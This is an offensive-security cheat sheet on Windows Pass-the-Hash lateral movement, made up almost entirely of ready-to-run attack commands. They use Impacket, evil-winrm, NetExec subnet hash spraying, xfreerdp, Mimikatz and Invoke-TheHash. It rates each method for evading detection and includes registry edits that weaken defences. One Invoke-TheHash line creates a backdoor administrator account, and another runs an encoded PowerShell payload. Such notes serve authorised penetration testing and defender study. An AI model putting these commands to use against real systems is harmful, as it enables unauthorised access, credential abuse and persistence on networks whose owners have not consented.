---
tags:
  - Foundational
  - Impacket
  - Lateral_Movement
  - Mimikatz
  - Pass-the-Hash
  - Windows
---

## Pass-the-Hash (PtH)
resources: [HackTricks Pass-the-Hash](https://book.hacktricks.xyz/windows-hardening/lateral-movement/pass-the-hash)

> [!info] Authenticate using NTLM hash without knowing the plaintext password. Works because NTLM hashes are not salted.

> [!important] **Requirements:**
> - Target user must be local admin on target machine
> - Network access to SMB (445), WMI (135+dynamic), or WinRM (5985/5986)

### Method Comparison
> **psexec** - Port 445 - Full shell - Bad OPSEC - Writes binary, triggers AV
> **smbexec** - Port 445 - Full shell - Medium OPSEC - No binary, noisy service creation
> **wmiexec** - Port 135 - Semi-interactive - Good OPSEC - Slower, sometimes unstable
> **atexec** - Port 445 - No shell - Good OPSEC - Single command via Task Scheduler
> **evil-winrm** - Port 5985 - Full shell - Good OPSEC - Best shell, needs WinRM enabled
> **netexec** - Port 445 - No shell - Good OPSEC - Mass spray, quick checks

### Hash Format Reference
> **LM Hash:** `aad3b435b51404eeaad3b435b51404ee` (disabled/empty)
> **NT Hash:** 32-character hex string
> **Full Format:** `LMHash:NTHash`
> **Empty LM:** Use `aad3b435b51404eeaad3b435b51404ee` as LM portion

### Impacket psexec [Local]
```bash
impacket-psexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>
```

```bash
impacket-psexec Administrator@<TargetIP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTHash>
```

### Impacket wmiexec [Local]
```bash
impacket-wmiexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>
```

```bash
impacket-wmiexec -hashes :<NTHash> <User>@<TargetIP>
```

### Impacket smbexec [Local]
```bash
impacket-smbexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>
```

### Impacket atexec [Local]
> [!tip] Single command execution via Task Scheduler.

```bash
impacket-atexec -hashes :<NTHash> <Domain>/<Username>@<TargetIP> "whoami"
```

### evil-winrm [Local]
```bash
evil-winrm -i <TargetIP> -u <Username> -H <NTHash>
```

```bash
evil-winrm -i <TargetIP> -u Administrator -H <NTHash> -s /scripts/ -e /executables/
```

### NetExec [Local]
```bash
nxc smb <TargetIP> -u <Username> -H <NTHash>
```

```bash
nxc smb <TargetIP> -u <Username> -H <NTHash> -x 'whoami'
```

```bash
nxc smb <TargetIP> -u <Username> -H <NTHash> --local-auth
```

### Spray Hash Across Subnet [Local]
```bash
nxc smb 192.168.1.0/24 -u Administrator -H <NTHash> --local-auth
```

```bash
nxc smb 192.168.1.0/24 -u <Username> -H <NTHash> -d <Domain>
```

### xfreerdp - RDP [Local]
> [!warning] Requires Restricted Admin Mode enabled on target.

```bash
xfreerdp /v:<TargetIP> /u:<Username> /pth:<NTHash>
```

```bash
xfreerdp /v:<TargetIP> /u:<Username> /pth:<NTHash> /restricted-admin
```

### Mimikatz [Remote]
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<Username> /rc4:<NTHash> /domain:<Domain> /run:cmd.exe" "exit"
```

```cmd
.\mimikatz.exe "sekurlsa::pth /user:Administrator /rc4:<NTHash> /domain:. /run:powershell.exe"
```

### Invoke-TheHash - SMB [Remote]
resources: [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command "whoami"
```

```powershell
Invoke-SMBExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command "net user attacker Password123 /add && net localgroup administrators attacker /add"
```

### Invoke-TheHash - WMI [Remote]
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command "powershell -e <Base64Payload>"
```

### UAC Considerations
> [!warning] UAC limits Pass-the-Hash for non-RID 500 local accounts.

#### Check LocalAccountTokenFilterPolicy [Remote]
```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
```

#### Enable PtH for Local Admins [Remote]
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

> **0** = Only RID-500 Administrator can PtH (default)
> **1** = All local admins can PtH

### Enable Restricted Admin Mode [Remote]
> [!info] Required for Pass-the-Hash via RDP.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
